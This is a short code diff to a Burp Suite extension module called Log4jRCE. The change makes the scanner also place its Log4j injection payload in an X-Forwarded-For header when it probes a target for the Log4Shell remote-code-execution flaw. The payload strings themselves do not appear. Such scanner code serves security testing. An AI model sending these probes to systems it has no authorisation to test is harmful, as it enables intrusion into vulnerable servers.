@@ -4,6 +4,9 @@ import java.util.ArrayList;
 import java.util.List;
 
 import burp.BurpDNSLogObject;
+import burp.BurpExtender;
+import burp.Getter;
+import burp.HelperPlus;
 import burp.IBurpExtenderCallbacks;
 import burp.IHttpRequestResponse;
 import burp.IRequestInfo;
@@ -30,6 +33,7 @@ public class Log4jRCE implements IModule {
     	
         IRequestInfo analyzeRequest = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
         byte[] modifiedRawRequest =baseRequestResponse.getRequest();
+        
         List<IScanIssue> issueForCollas = new ArrayList<IScanIssue>();
         
         List<String> payloads = new ArrayList<>();
@@ -45,6 +49,9 @@ public class Log4jRCE implements IModule {
             
             payloaditem = String.format(payloaditem, fullPayload);
     		modifiedRawRequest = insertionPoint.buildRequest(payloaditem.getBytes());
+    		
+    		HelperPlus getter = new HelperPlus(BurpExtender.getHelpers());
+    		modifiedRawRequest = getter.addOrUpdateHeader(true, modifiedRawRequest, "X-Forwarded-For", payloaditem);
     		
     		System.out.println("=================\r\n");
     		System.out.println(new String(modifiedRawRequest));
